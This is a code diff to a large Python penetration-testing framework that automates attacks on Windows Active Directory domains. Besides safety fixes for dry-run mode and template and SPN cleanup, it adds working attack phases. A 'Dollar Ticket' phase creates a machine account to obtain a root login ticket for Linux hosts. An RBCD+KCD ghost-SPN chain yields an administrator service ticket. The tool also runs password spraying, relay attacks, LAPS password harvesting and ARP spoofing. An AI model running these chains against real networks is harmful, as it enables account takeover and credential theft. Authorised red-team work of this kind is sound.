@@ -58,7 +58,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.9.0"
+VERSION = "4.10.0"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 KRBRELAYX_DIR = TOOLS_DIR / "krbrelayx"
@@ -190,6 +190,7 @@ class Config:
     machine_password: str = ""
     alt_spn: str = ""              # KCD protocol-transition bypass (tgssub-style)
     in_ccache: str = ""            # input ccache for --phase tgs-rewrite
+    target_user: str = ""          # for --phase dollar-ticket (e.g., 'root')
 
     # DPAPI options
     no_dpapi: bool = False
@@ -403,8 +404,13 @@ def run(cmd: list[str], cfg: Config, timeout: int = 300,
     cmd_str = " ".join(str(c) for c in cmd)
     log.debug(f"$ {cmd_str}")
 
-    if cfg.dry_run and not bg:
-        print(f"{C.YELLOW}  [DRY RUN] {cmd_str}{C.NC}")
+    if cfg.dry_run:
+        # Print + return-without-launching applies to BOTH foreground and
+        # background calls. Without this, --dry-run would still spawn ARP
+        # spoofers, mitm6, Responder, ntlmrelayx, etc. — a serious safety
+        # bug on customer networks.
+        tag = "DRY RUN bg" if bg else "DRY RUN"
+        print(f"{C.YELLOW}  [{tag}] {cmd_str}{C.NC}")
         return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
 
     if bg:
@@ -911,6 +917,16 @@ class AutoDiscovery:
 def check_prerequisites(cfg: Config) -> bool:
     log.info("🔧 Checking prerequisites...")
     missing = False
+    # Track count of optional warnings emitted so the closing line
+    # doesn't falsely claim "all prerequisites satisfied" when many
+    # optional tools (mitm6, responder, certipy, bloodyAD, …) are
+    # absent. We monkey-patch a counter onto the bound logger.
+    optional_missing_count = [0]
+    _orig_warn = log.warning
+    def _counted_warn(msg, *a, **kw):
+        optional_missing_count[0] += 1
+        _orig_warn(msg, *a, **kw)
+    log.warning = _counted_warn  # restored before return
 
     # Core exploit
     if not (CVE_DIR / "CVE-2025-33073.py").exists():
@@ -1092,11 +1108,16 @@ def check_prerequisites(cfg: Config) -> bool:
     else:
         log.warning("coercer not found (DHCP coercion phase disabled — pipx install coercer)")
 
+    log.warning = _orig_warn  # restore before returning
     if missing:
         log.error("Missing required prerequisites — see warnings above for "
                   "install hints (apt / pipx / pip).")
         return False
-    ok("All prerequisites satisfied")
+    n_opt = optional_missing_count[0]
+    if n_opt:
+        ok(f"Required prerequisites satisfied ({n_opt} optional tool(s) missing — see ⚠ above)")
+    else:
+        ok("All prerequisites satisfied")
     return True
 
 
@@ -1923,6 +1944,14 @@ def cleanup_dns_records(cfg: Config):
         content = f.read_text()
         matches = re.findall(r"(?:Adding DNS record[:\s]+|record.*name[:\s]+)(\S+)", content)
         records.extend(matches)
+    # Unicode-homoglyph DNS records (Synacktiv 2026 chain) are written to
+    # unicode-dns-*.txt by register_unicode_dns_record(); they need cleanup
+    # too or the homoglyph hostname stays pointed at attacker forever.
+    for f in cfg.work_dir.glob("unicode-dns-*.txt"):
+        content = f.read_text()
+        # The success log line shape is "...record <homoglyph> -> <attacker_ip>"
+        for m in re.finditer(r"\brecord\s+(\S+)\s*(?:->|=>|to)\s*\d+\.\d+\.\d+\.\d+", content):
+            records.append(m.group(1))
 
     if not records:
         return  # nothing to clean — stay quiet
@@ -2106,22 +2135,37 @@ def try_ghost_spn_upgrade(target_machine: str, cfg: Config) -> bool:
     ghost_spn = f"HOST/ghost-{int(time.time())}.{cfg.domain}"
 
     out_file = cfg.work_dir / f"ghost-spn-{target_machine}.txt"
-    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
+
+    # 1) Set TRUSTED_FOR_DELEGATION on the target. Check the rc — if this
+    # fails (e.g. SeEnableDelegation missing) the rest of the chain is
+    # pointless, so abort cleanly instead of silently proceeding.
+    uac_cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
         "add", "uac", target_machine, "-f", "TRUSTED_FOR_DELEGATION",
     ]
-    run(cmd, cfg, timeout=30, outfile=out_file)
+    uac_result = run(uac_cmd, cfg, timeout=30, outfile=out_file)
+    if uac_result.returncode != 0:
+        log.warning(f"UAC TRUSTED_FOR_DELEGATION write failed on {target_machine} — "
+                    f"skipping ghost-SPN (need SeEnableDelegation)")
+        return False
 
-    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
+    spn_cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
         "set", "object", target_machine, "servicePrincipalName", "-v", ghost_spn,
     ]
-    result = run(cmd, cfg, timeout=30, outfile=out_file)
+    result = run(spn_cmd, cfg, timeout=30, outfile=out_file)
     if result.returncode != 0:
         log.warning(f"Ghost-SPN write failed (need SPN-write rights on {target_machine})")
+        # Roll back the UAC change since the SPN side never landed.
+        if not cfg.no_cleanup and tool_exists("bloodyAD"):
+            run(["bloodyAD"] + _bloody_auth_args(cfg) +
+                ["remove", "uac", target_machine, "-f", "TRUSTED_FOR_DELEGATION"],
+                cfg, timeout=30)
         return False
 
     ok(f"Ghost SPN planted: {ghost_spn}")
     detail(f"Trigger Kerberos coercion to {ghost_spn} → krbtgt-encrypted TGS issued")
     detail(f"Decrypt with {target_machine}$ key and relay (krbrelayx --aesKey)")
+    detail(f"Cleanup: bloodyAD remove object {target_machine} servicePrincipalName -v {ghost_spn}")
+    detail(f"         bloodyAD remove uac {target_machine} -f TRUSTED_FOR_DELEGATION")
     return True
 
 
@@ -2136,6 +2180,9 @@ def run_reflect_tcpport(cfg: Config) -> bool:
 
     target_label = cfg.reflect_host or "<foothold>"
     script_path = cfg.work_dir / "reflect-tcpport-trigger.ps1"
+    if cfg.dry_run:
+        print(f"{C.YELLOW}  [DRY RUN] would write {script_path}{C.NC}")
+        return True
     script_path.write_text(f"""# CVE-2026-24294 trigger — run on the {target_label} foothold (admin shell NOT required)
 # Prereq: Win11 24H2 or Server 2025, pre-March-2026 patch (no loopback-signing enforcement)
 # Usage:  powershell -ExecutionPolicy Bypass -File reflect-tcpport-trigger.ps1
@@ -2202,6 +2249,9 @@ def run_reflect_loopback(cfg: Config) -> bool:
         homoglyph = _make_unicode_homoglyph(target_fqdn)
 
     script_path = cfg.work_dir / "reflect-loopback-trigger.ps1"
+    if cfg.dry_run:
+        print(f"{C.YELLOW}  [DRY RUN] would write {script_path}{C.NC}")
+        return True
     script_path.write_text(f"""# CVE-2026-26128 trigger — run on the {target_fqdn} foothold (admin shell NOT required)
 # Prereq: Win11 24H2 or Server 2025, pre-March-2026 patch
 # Pair with: krbrelayx (Unicode-SPN patch) on attacker {cfg.attacker_ip}
@@ -2532,7 +2582,11 @@ def _password_spray(cfg: Config, users: list[str], password: str) -> bool:
         return False
     user_file = cfg.work_dir / "spray-users.txt"
     user_file.write_text("\n".join(users) + "\n")
-    out_file = cfg.work_dir / f"spray-{password}.txt"
+    # Sanitize the password into a safe filename component — it may contain
+    # /, \, NUL, quotes, or other path-invalid chars that would crash the
+    # write or, worst-case, traverse out of work_dir.
+    pw_slug = re.sub(r"[^A-Za-z0-9_-]", "_", password)[:32] or "pw"
+    out_file = cfg.work_dir / f"spray-{pw_slug}.txt"
     cmd = ["nxc", "smb", cfg.dc_ip, "-u", str(user_file), "-p", password,
            "-d", cfg.domain, "--continue-on-success"]
     log.info(f"🔍 Spraying '{password}' across {len(users)} user(s)")
@@ -2989,7 +3043,7 @@ def run_wpad_attack(cfg: Config) -> bool:
     """
     phase_header("PHASE 4: WPAD POISONING")
 
-    relay_target = cfg.specific_target or f"ldaps://{cfg.dc_ip}" if cfg.dc_ip else ""
+    relay_target = cfg.specific_target or (f"ldaps://{cfg.dc_ip}" if cfg.dc_ip else "")
     if not relay_target:
         log.error("No relay target — need --target or --dc-ip for WPAD relay")
         return False
@@ -3235,7 +3289,7 @@ def run_wsus_relay(cfg: Config) -> bool:
         return False
 
     port = cfg.wsus_port or (WSUS_HTTPS_PORT if cfg.wsus_https else WSUS_HTTP_PORT)
-    relay_target = cfg.specific_target or f"ldap://{cfg.dc_ip}" if cfg.dc_ip else ""
+    relay_target = cfg.specific_target or (f"ldap://{cfg.dc_ip}" if cfg.dc_ip else "")
     if not relay_target:
         log.error("Need --target or --dc-ip for WSUS relay")
         return False
@@ -4555,24 +4609,29 @@ def _certihound_find(cfg: Config) -> Optional[dict]:
            "-o", str(out_dir), "--format", "both"]
 
     log.info("🔍 Enumerating AD CS with Certihound...")
-    # OpenSSL 3 disables MD4 by default on Debian/Ubuntu — NTLM needs it
-    env_prev = os.environ.get("OPENSSL_CONF")
-    legacy_conf = out_dir / "openssl-legacy.cnf"
-    legacy_conf.write_text(
-        "openssl_conf = openssl_init\n"
-        "[openssl_init]\nproviders = provider_sect\n"
-        "[provider_sect]\ndefault = default_sect\nlegacy = legacy_sect\n"
-        "[default_sect]\nactivate = 1\n"
-        "[legacy_sect]\nactivate = 1\n"
-    )
-    os.environ["OPENSSL_CONF"] = str(legacy_conf)
-    try:
+    if cfg.dry_run:
+        # Don't write openssl-legacy.cnf and don't mutate process env
+        # in dry-run; let the run() helper print the [DRY RUN] line.
         result = run(cmd, cfg, timeout=180)
-    finally:
-        if env_prev is None:
-            os.environ.pop("OPENSSL_CONF", None)
-        else:
-            os.environ["OPENSSL_CONF"] = env_prev
+    else:
+        # OpenSSL 3 disables MD4 by default on Debian/Ubuntu — NTLM needs it
+        env_prev = os.environ.get("OPENSSL_CONF")
+        legacy_conf = out_dir / "openssl-legacy.cnf"
+        legacy_conf.write_text(
+            "openssl_conf = openssl_init\n"
+            "[openssl_init]\nproviders = provider_sect\n"
+            "[provider_sect]\ndefault = default_sect\nlegacy = legacy_sect\n"
+            "[default_sect]\nactivate = 1\n"
+            "[legacy_sect]\nactivate = 1\n"
+        )
+        os.environ["OPENSSL_CONF"] = str(legacy_conf)
+        try:
+            result = run(cmd, cfg, timeout=180)
+        finally:
+            if env_prev is None:
+                os.environ.pop("OPENSSL_CONF", None)
+            else:
+                os.environ["OPENSSL_CONF"] = env_prev
 
     if result.returncode != 0:
         log.warning("Certihound enumeration failed — falling back to certipy")
@@ -4736,34 +4795,48 @@ def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
             return str(pfx_path)
 
     elif esc_type == "ESC4":
-        # Modify template → exploit as ESC1 → ALWAYS restore (try/finally)
+        # Modify template → exploit as ESC1 → ALWAYS restore (try/finally).
+        # certipy `-save-old` writes <template>.json to the CURRENT WORKING
+        # DIRECTORY, not cfg.work_dir. We must chdir into work_dir for
+        # both save and restore so the file lands and is found in the
+        # same place. Without this, the restore silently no-ops and the
+        # template stays vulnerable indefinitely — a major hazard on
+        # customer environments.
         log.info(f"  Exploiting ESC4: modifying template '{template}' to enable ESC1...")
-        save_cmd = (
-            ["certipy", "template"] + auth_args +
-            ["-template", template, "-save-old"]
-        )
-        result = run(save_cmd, cfg, timeout=60)
-        if result.returncode != 0:
-            log.warning(f"  ESC4: Failed to modify template '{template}'")
-            return None
-
-        pfx = None
+        prev_cwd = os.getcwd()
         try:
-            # Now exploit as ESC1
-            pfx = _adcs_exploit_template(template, ca_name, "ESC1", cfg)
+            os.chdir(cfg.work_dir)
+            save_cmd = (
+                ["certipy", "template"] + auth_args +
+                ["-template", template, "-save-old"]
+            )
+            result = run(save_cmd, cfg, timeout=60)
+            if result.returncode != 0:
+                log.warning(f"  ESC4: Failed to modify template '{template}'")
+                return None
+
+            pfx = None
+            try:
+                # Now exploit as ESC1
+                pfx = _adcs_exploit_template(template, ca_name, "ESC1", cfg)
+            finally:
+                # ALWAYS restore original template, even on exception.
+                # certipy wrote the .json into cfg.work_dir (we chdir'd).
+                log.info(f"  ESC4: Restoring original template configuration...")
+                old_config = cfg.work_dir / f"{template}.json"
+                if old_config.exists():
+                    restore_cmd = (
+                        ["certipy", "template"] + auth_args +
+                        ["-template", template, "-configuration", str(old_config)]
+                    )
+                    run(restore_cmd, cfg, timeout=60)
+                    ok(f"  ESC4: Template '{template}' restored")
+                else:
+                    log.error(f"  ESC4: Cannot restore — {old_config} not found! "
+                              f"Template may be left modified! Manually run: "
+                              f"certipy template ... -template {template} -save-old")
         finally:
-            # ALWAYS restore original template, even on exception
-            log.info(f"  ESC4: Restoring original template configuration...")
-            old_config = cfg.work_dir / f"{template}.json"
-            if old_config.exists():
-                restore_cmd = (
-                    ["certipy", "template"] + auth_args +
-                    ["-template", template, "-configuration", str(old_config)]
-                )
-                run(restore_cmd, cfg, timeout=60)
-                ok(f"  ESC4: Template '{template}' restored")
-            else:
-                log.error(f"  ESC4: Cannot restore — {old_config} not found! Template may be modified!")
+            os.chdir(prev_cwd)
 
         return pfx
 
@@ -6020,6 +6093,275 @@ def run_rbcd_attack(target: str, cfg: Config) -> bool:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Dollar Ticket — KDC's automatic $-suffix retry on principal lookup
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def run_dollar_ticket(cfg: Config) -> bool:
+    """Dollar Ticket attack — abuses the KDC's name-resolution fallback that
+    auto-appends '$' when looking up a principal that doesn't exist as a
+    user but does exist as a machine account.
+
+    Flow (GOAD-Dracarys / Triop research):
+      1. Create attacker-controlled machine account named after a target
+         Linux user (e.g., 'root$', 'sqladmin$').
+      2. Request a TGT for the bare username (no $) using the machine
+         account's password. The KDC's principal lookup falls back to
+         '<user>$', returns a TGT whose cname stays the user.
+      3. The ticket can then be used for GSSAPI SSH on a domain-joined
+         Linux host (`ssh -K -o GSSAPIAuthentication=yes <user>@host`),
+         logging in as that local user.
+
+    Required cfg:
+      cfg.target_user — the user to impersonate (--target-user)
+      cfg.has_creds   — any low-priv domain creds (we'll create the machine)
+      MAQ > 0 (or pre-created --machine-account)"""
+    phase_header(f"DOLLAR TICKET ATTACK (target: {cfg.target_user})")
+
+    if not cfg.has_creds:
+        log.error("Dollar Ticket needs domain credentials (-u/-p)")
+        return False
+    if not cfg.target_user:
+        log.error("Dollar Ticket needs --target-user (e.g. root, sqladmin)")
+        return False
+    if not (cfg.dc_ip and cfg.domain):
+        log.error("Dollar Ticket needs --dc-ip and --domain (auto-discovery should set these)")
+        return False
+    if not tool_exists("impacket-getTGT"):
+        log.error("impacket-getTGT not found — install impacket-scripts")
+        return False
+
+    # Reuse _create_machine_account by temporarily injecting a name
+    # matching the target user (e.g. 'root$'). _create_machine_account()
+    # has an early-return when BOTH machine_account+machine_password are
+    # set (treats them as pre-created), so we MUST clear the password to
+    # force the create branch to run for real.
+    desired_name = f"{cfg.target_user}$"
+    saved_machine = cfg.machine_account
+    saved_pass = cfg.machine_password
+    cfg.machine_account = desired_name
+    cfg.machine_password = ""  # force the create branch in the helper
+    try:
+        machine_name, machine_pass = _create_machine_account(cfg)
+    finally:
+        cfg.machine_account = saved_machine
+        cfg.machine_password = saved_pass
+
+    if not machine_name:
+        log.error("Could not create machine account — aborting Dollar Ticket")
+        return False
+
+    # Now request a TGT for the BARE user (no $). KDC retries with $.
+    log.info(f"🎫 getTGT for bare '{cfg.target_user}' (KDC will auto-retry with $)")
+    out_file = cfg.work_dir / f"dollar-ticket-{cfg.target_user}.log"
+    cmd = [
+        "impacket-getTGT",
+        f"{cfg.domain}/{cfg.target_user}:{machine_pass}",
+        "-dc-ip", cfg.dc_ip,
+    ]
+    # impacket-getTGT writes ccache to CWD; chdir into work_dir
+    prev_cwd = os.getcwd()
+    try:
+        os.chdir(cfg.work_dir)
+        result = run(cmd, cfg, timeout=60, outfile=out_file)
+    finally:
+        os.chdir(prev_cwd)
+
+    output = out_file.read_text(errors="replace") if out_file.exists() else ""
+    if cfg.dry_run:
+        return True
+
+    if "Saving ticket in" not in output:
+        log.error(f"Dollar Ticket failed — see {out_file}")
+        log.warning("Possible causes:")
+        detail("- KDC didn't fall back to $-suffix lookup (some Server 2025+ builds reject this)")
+        detail(f"- A real user named '{cfg.target_user}' exists and shadowed the lookup")
+        detail("- Machine account creation succeeded but DC delayed replication")
+        return False
+
+    # Locate the produced ccache; impacket names it like '<user>.ccache'.
+    # Filter the glob fallback by mtime > start_time so we never pick up
+    # a stale ccache left over from a previous run.
+    expected = cfg.work_dir / f"{cfg.target_user}.ccache"
+    if not (expected.exists() and expected.stat().st_mtime >= cfg.start_time):
+        candidates = sorted(
+            (p for p in cfg.work_dir.glob(f"{cfg.target_user}*.ccache")
+             if p.stat().st_mtime >= cfg.start_time),
+            key=lambda p: p.stat().st_mtime, reverse=True,
+        )
+        if candidates:
+            expected = candidates[0]
+        else:
+            log.warning(f"getTGT reported success but no fresh ccache found in {cfg.work_dir}")
+            return False
+
+    final_ccache = cfg.work_dir / f"dollar-ticket-{cfg.target_user}.ccache"
+    if expected != final_ccache:
+        import shutil as _sh
+        _sh.copy2(str(expected), str(final_ccache))
+
+    success_box(f"Dollar Ticket: TGT for '{cfg.target_user}' obtained!")
+    detail(f"Ticket: {final_ccache}")
+    detail(f"Use:    export KRB5CCNAME={final_ccache}")
+    detail(f"        ssh -K -o GSSAPIAuthentication=yes {cfg.target_user}@<linux-host>.{cfg.domain}")
+    detail(f"        # or, if target is Windows: evil-winrm -i <host> -r {cfg.domain}")
+    return True
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# RBCD + KCD Chain — bypass protocol-transition restriction via ghost SPN
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _cleanup_ghost_spn(target_sam: str, ghost_spn: str, cfg: Config):
+    """Best-effort revert of a ghost-SPN write so the target's SPN list
+    doesn't permanently carry our planted entry."""
+    if cfg.no_cleanup or not tool_exists("bloodyAD"):
+        return
+    log.info(f"🧹 Removing ghost SPN '{ghost_spn}' from {target_sam}")
+    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
+        "remove", "object", target_sam, "servicePrincipalName",
+        "-v", ghost_spn,
+    ]
+    run(cmd, cfg, timeout=30)
+
+
+def run_rbcd_kcd_chain(cfg: Config) -> bool:
+    """Two-stage RBCD+KCD chain (GOAD-Dracarys / Synacktiv style) that
+    bypasses the constrained-delegation protocol-transition restriction:
+
+      1. Plant a ghost SPN on target_machine (needs WriteSPN rights).
+      2. Create attacker-controlled machine account.
+      3. Set RBCD: attacker_machine → target_machine.
+      4. S4U2Self+S4U2Proxy via attacker_machine targeting the ghost SPN.
+         The TGS is encrypted with target_machine's key (because the SPN
+         is registered on target).
+      5. impacket-getST -altservice rewrites the issued ticket's sname
+         to the real service SPN at issue time (equivalent to running
+         tgssub.py on the result).
+
+    Result: a ccache holding an admin TGS valid for target_machine's key
+    with sname matching the real service — usable by evil-winrm / smbexec
+    immediately.
+
+    Required cfg:
+      cfg.specific_target — target machine in sAMAccountName form (e.g.
+                            'VHAGAR$') or 'VHAGAR.dom' — we have WriteSPN here
+      cfg.alt_spn         — real SPN we want to wield (default: HTTP/<target_host>)
+      cfg.has_creds       — domain creds with WriteSPN on target
+      MAQ > 0 (or pre-created --machine-account)"""
+    if not cfg.has_creds:
+        log.error("RBCD+KCD chain needs domain credentials")
+        return False
+    if not cfg.specific_target:
+        log.error("RBCD+KCD chain needs --target/-T (target machine with WriteSPN)")
+        return False
+    if not (cfg.dc_ip and cfg.domain):
+        log.error("RBCD+KCD chain needs --dc-ip and --domain")
+        return False
+    if not tool_exists("bloodyAD"):
+        log.error("bloodyAD not found — needed to plant ghost SPN")
+        return False
+    if not tool_exists("impacket-getST"):
+        log.error("impacket-getST not found")
+        return False
+
+    # Normalise target to sAMAccountName form (HOST$) and host FQDN form
+    raw_target = cfg.specific_target
+    if "." in raw_target:
+        target_host = raw_target.lower().rstrip(".")
+        target_sam = raw_target.split(".", 1)[0].rstrip("$").upper() + "$"
+    else:
+        target_sam = raw_target.rstrip("$").upper() + "$"
+        target_host = (raw_target.rstrip("$").lower() + "." + cfg.domain)
+
+    real_spn = cfg.alt_spn or f"HTTP/{target_host}"
+    if "/" not in real_spn:
+        log.error(f"--alt-spn must be 'service/host', got {real_spn!r}")
+        return False
+    service_class = real_spn.split("/")[0]
+
+    phase_header(f"RBCD+KCD CHAIN ({target_sam} → {real_spn})")
+
+    # Step 1 — plant ghost SPN. Add a random suffix in case two operators
+    # run this simultaneously against the same domain (1-second granularity
+    # alone collides too easily).
+    import random
+    ghost_host = f"ghost-{int(time.time())}-{random.randint(1000, 9999)}.{cfg.domain}"
+    ghost_spn = f"{service_class}/{ghost_host}"
+    log.info(f"👻 Planting ghost SPN '{ghost_spn}' on {target_sam}")
+    out_spn = cfg.work_dir / f"rbcd-kcd-ghost-{target_sam}.txt"
+    result = run(
+        ["bloodyAD"] + _bloody_auth_args(cfg) +
+        ["set", "object", target_sam, "servicePrincipalName", "-v", ghost_spn],
+        cfg, timeout=30, outfile=out_spn,
+    )
+    if result.returncode != 0:
+        log.error(f"Ghost SPN write rejected — need WriteSPN rights on {target_sam}")
+        detail("Check BloodHound for a WriteSPN edge from your principal to the target")
+        return False
+    ok(f"Ghost SPN planted: {ghost_spn}")
+
+    # Step 2 — create attacker-controlled machine account
+    machine_name, machine_pass = _create_machine_account(cfg)
+    if not machine_name:
+        log.error("Machine account creation failed — aborting chain")
+        _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
+        return False
+
+    # Step 3 — set RBCD on target so machine_name can act on its behalf
+    if not _set_rbcd(target_sam, machine_name, cfg):
+        log.error("RBCD set failed — aborting chain")
+        _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
+        return False
+
+    # Step 4+5 — S4U2Self+S4U2Proxy via getST with -altservice rewrite
+    log.info(f"🎫 S4U2Proxy: ghost {ghost_spn} → real {real_spn} (sname rewrite at issue time)")
+    out_file = cfg.work_dir / f"rbcd-kcd-{target_sam}.log"
+    cmd = [
+        "impacket-getST",
+        "-spn", ghost_spn,
+        "-impersonate", "administrator",
+        "-altservice", real_spn,
+        f"{cfg.domain}/{machine_name}:{machine_pass}",
+        "-dc-ip", cfg.dc_ip,
+    ]
+    prev_cwd = os.getcwd()
+    try:
+        os.chdir(cfg.work_dir)
+        result = run(cmd, cfg, timeout=120, outfile=out_file)
+    finally:
+        os.chdir(prev_cwd)
+
+    output = out_file.read_text(errors="replace") if out_file.exists() else ""
+    if cfg.dry_run:
+        _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
+        return True
+
+    saved_match = re.search(r"Saving ticket in\s+(\S+\.ccache)", output)
+    if saved_match:
+        saved_path = Path(saved_match.group(1))
+        if not saved_path.is_absolute():
+            saved_path = cfg.work_dir / saved_path.name
+        if saved_path.exists():
+            final = cfg.work_dir / f"rbcd-kcd-{target_sam}.ccache"
+            if saved_path != final:
+                import shutil as _sh
+                _sh.copy2(str(saved_path), str(final))
+            success_box(f"RBCD+KCD: admin TGS for {real_spn} issued!")
+            detail(f"Ticket: {final}")
+            detail(f"Use:    export KRB5CCNAME={final}")
+            if service_class.lower() == "http":
+                detail(f"        evil-winrm -i {target_host} -r {cfg.domain}")
+            else:
+                detail(f"        impacket-psexec -k -no-pass {target_host}")
+            _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
+            return True
+
+    log.error(f"S4U2Proxy step failed — see {out_file}")
+    _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
+    return False
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # SCCM NAA Credential Theft
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -6126,6 +6468,9 @@ def run_sccm_attack(cfg: Config) -> bool:
         "show",
         "-u", cfg.username,
         "-d", cfg.domain,
+        "-dc-ip", cfg.dc_ip,        # Other sccmhunter calls pass this; without
+                                    # it LDAP queries break on networks where
+                                    # the attacker can't resolve AD DNS names
     ]
     if cfg.nthash:
         cmd += ["-hashes", f":{cfg.nthash}"]
@@ -6430,12 +6775,19 @@ def consume_nxc_findings(cfg: Config):
         f = cfg.work_dir / f"nxc-{name}.txt"
         return f.read_text(errors="replace") if f.exists() else ""
 
-    # --- LAPS: lines like "LAPS ... HOST: <password>" or "[+] HOST$: <pass>"
+    # --- LAPS: nxc emits "[+] <HOST>: <password>" — match on the "[+] HOST: PW"
+    # shape rather than the protocol token "LAPS" (which doesn't appear on
+    # the password lines themselves). Skip the empty-result lines that
+    # mention the schema attributes.
     laps_text = _read("laps")
     laps_pairs: list[tuple[str, str]] = []
     for line in laps_text.splitlines():
-        m = re.search(r"\bLAPS\b.*?\s([A-Za-z0-9-]+\$?)\s*:\s*(\S{8,})", line)
-        if m and "ms-MCS-AdmPwd" not in line and "msLAPS-Password" not in line:
+        if "ms-MCS-AdmPwd" in line or "msLAPS-Password" in line:
+            continue
+        if "[+]" not in line:
+            continue
+        m = re.search(r"\[\+\]\s+([A-Za-z0-9-]+\$?)\s*:\s*(\S{8,})\s*$", line)
+        if m:
             host, pw = m.group(1), m.group(2)
             if pw not in {"None", "null"}:
                 laps_pairs.append((host, pw))
@@ -6520,9 +6872,9 @@ def consume_nxc_findings(cfg: Config):
         ok(f"📌 pre2k machine accounts: {len(pre2k_machines)}")
         (cfg.work_dir / "enrich-pre2k.txt").write_text("\n".join(pre2k_machines) + "\n")
 
-    # --- maq value
+    # --- maq value (accept both "MachineAccountQuota: N" and "= N" formats)
     maq_text = _read("maq")
-    m = re.search(r"MachineAccountQuota:\s*(\d+)", maq_text)
+    m = re.search(r"MachineAccountQuota[:\s=]+(\d+)", maq_text)
     if m:
         maq = int(m.group(1))
         if maq > 0:
@@ -7303,9 +7655,18 @@ def run_full_auto(cfg: Config):
         log.info("No WPAD/WSUS/PXE traffic seen passively — will still attempt active attacks")
 
     # Collect all hosts seen in passive sniff — prioritize for ARP spoofing
-    sniffed_hosts = set()
-    for key in sniff_results:
-        sniffed_hosts.update(sniff_results[key])
+    # Collect IPs only — passive_sniff() also returns "domains" (set of
+    # domain name strings) and "dcs" (dict ip → service-set). Without
+    # this filter, ARP-spoof prioritisation would receive domain strings
+    # and try to spoof them, wasting work and risking subtle bugs.
+    sniffed_hosts: set[str] = set()
+    for key, val in sniff_results.items():
+        if key == "domains":
+            continue                # set of domain strings, not hosts
+        if key == "dcs":
+            sniffed_hosts.update(val.keys())  # dict — keys are IPs
+        else:
+            sniffed_hosts.update(val)         # set of source IPs
     sniffed_hosts.discard(cfg.attacker_ip)
     sniffed_hosts.discard(cfg.gateway)
 
@@ -7323,8 +7684,13 @@ def run_full_auto(cfg: Config):
             ok("WPAD/LLMNR traffic was detected — WPAD poisoning has high chance of success")
         log.info("Trying WPAD poisoning...")
         if run_wpad_attack(cfg):
-            try_crack_hashes(cfg)
-            got_creds = cfg.has_creds
+            # try_crack_hashes returns (user, pass, domain) — must mutate cfg
+            # ourselves; the helper deliberately doesn't touch cfg so callers
+            # can choose to apply or discard the cracked creds.
+            creds = try_crack_hashes(cfg)
+            if creds:
+                cfg.username, cfg.password, cfg.domain = creds
+                got_creds = True
 
     # Step 4: WSUS relay (machine account capture)
     if not cfg.no_wsus:
@@ -7336,9 +7702,10 @@ def run_full_auto(cfg: Config):
         if wsus_server:
             log.info(f"WSUS server found at {wsus_server} — attempting relay...")
             run_wsus_relay(cfg)
-            try_crack_hashes(cfg)
-            if not got_creds:
-                got_creds = cfg.has_creds
+            creds = try_crack_hashes(cfg)
+            if creds and not got_creds:
+                cfg.username, cfg.password, cfg.domain = creds
+                got_creds = True
 
     # Step 4b: PXE boot image credential theft (zero-auth via TFTP)
     if not got_creds and (pxe_viable or not (wpad_viable or wsus_viable)):
@@ -7741,6 +8108,16 @@ def parse_args() -> Config:
           %(prog)s --phase tgs-rewrite \\
                    --in-ccache /tmp/admin@HTTP_arrax.dracarys.lab.ccache \\
                    --alt-spn HTTP/vhagar.dracarys.lab
+
+          # Dollar Ticket — TGT for 'root' via auto-created root$ machine acct
+          # (target a domain-joined Linux box for GSSAPI SSH login as root)
+          %(prog)s -u sunfyre -p 'BSno5DP4tjJ4jIu8is3B' -d dracarys.lab \\
+                   --phase dollar-ticket --target-user root
+
+          # RBCD+KCD chain — full ghost-SPN + RBCD + altservice rewrite, in one shot
+          # (need WriteSPN on the target machine — check BloodHound first)
+          %(prog)s -u viserion -p '...' -d dracarys.lab \\
+                   --phase rbcd-kcd -T VHAGAR$ --alt-spn HTTP/vhagar.dracarys.lab
         """),
     )
 
@@ -7812,6 +8189,9 @@ def parse_args() -> Config:
                           "(tgssub-style KCD protocol-transition bypass)")
     adv.add_argument("--in-ccache", default="",
                      help="Input ccache for --phase tgs-rewrite")
+    adv.add_argument("--target-user", default="",
+                     help="Target Linux user for --phase dollar-ticket "
+                          "(e.g. 'root', 'sqladmin') — opt-in only, not in default chain")
     adv.add_argument("--no-dpapi", action="store_true",
                      help="Skip DPAPI backup key extraction after DCSync")
     adv.add_argument("--no-bloodhound", action="store_true",
@@ -7848,6 +8228,7 @@ def parse_args() -> Config:
                           choices=["full", "enum", "exploit", "dcsync", "arp", "wpad", "wsus",
                                    "pxe", "sniff", "adcs", "roast", "sccm", "enrich", "discover",
                                    "bloodhound", "tgs-rewrite", "loot",
+                                   "dollar-ticket", "rbcd-kcd",
                                    "reflect-tcpport", "reflect-loopback", "kerb-reflect"],
                           help="Run a single phase")
